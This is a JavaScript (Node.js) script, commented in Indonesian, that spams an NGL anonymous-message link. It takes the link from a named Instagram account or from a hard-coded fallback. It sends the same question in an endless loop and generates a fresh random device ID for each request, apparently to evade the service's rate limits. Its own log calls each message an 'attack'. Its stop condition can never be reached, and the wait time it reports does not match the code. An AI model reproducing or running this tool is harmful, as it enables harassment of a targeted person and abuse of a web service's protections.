
const fetchIn = require("./fetch")
const { getInstagramLink } = require("./instagramFetcher")
const readline = require("readline")

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
})

let data = {
  username: "",
  question: "",
  deviceId: require("crypto").randomUUID(),
  gameSlug: "",
  referrer: ""
}

let setTime = 0
let loadTime = 0

async function question(quest) {
  return new Promise((a,b) => {
    rl.question(quest, (answer) => {
      if(!answer) {
        b("Silahkan Masukan Data Yang Diperintahkan")
      }
      if(isNaN(answer)) {
        a(answer)
      } else {
        a(Number(answer))
      }
    })
  })
}
async function FetchUp() {
  data.deviceId = require("crypto").randomUUID()
  try {
    if(setTime >= 10000000) {
      console.log("Berhasil Mengirim Pesan Secara Paksa!")
      process.exit()
    }
    const _ms_ = await fetchIn({ body: JSON.stringify(data) })
    if(_ms_.status === 200) {
      loadTime++

      console.log(`[${setTime}/${loadTime}] attack {${data.username}}with question {${data.question}} sent successfully!`)
      data.deviceId = require("crypto").randomUUID()
      FetchUp()
    } else {
      setTimeout(FetchUp, (1000*60*3))
      console.log(`[${setTime}/${loadTime}] rate limit reached, waiting 5 minutes before retrying...`)
      console.log("HTTP status:", _ms_.status)
    }
  } catch(err) {
    FetchUp()
    console.log("something happened !")
  }
}
async function StartInit() {
  console.log("--------[ Setup Boomer ]-------")
  const times    = 1
  const fetched = await getInstagramLink("n4y4n_a")
  let username = "https://ngl.link/warriorsofucek"
  if (fetched && fetched.startsWith("http")) {
    try {
      const check = await fetch(fetched)
      username = check.ok ? fetched : "https://ngl.link/warriorsofucek"
    } catch {
      username = "https://ngl.link/warriorsofucek"
    }
  }
  data.username = username
  data.question =  "10 trillion billion hillion gillion dollor goh goh"
  setTime = times
  console.log("---------[ Validated ]---------")
  fetch(`${username}`).then(fo => {
    if(fo.status != 200) {
      throw new Error("User tidak ditemukan!")
    }
    if(typeof times === "string" || times === 0) {
      throw new Error(
        "Variable spamming bukan berupa angka dan hanya mengembalikan nilai 0"
      )
    } else {
      console.log("🎉 Semua sudah siap!")
    }
    console.log("-----[ Start Booming 💣 ]------")
    FetchUp()
  })
}
StartInit()
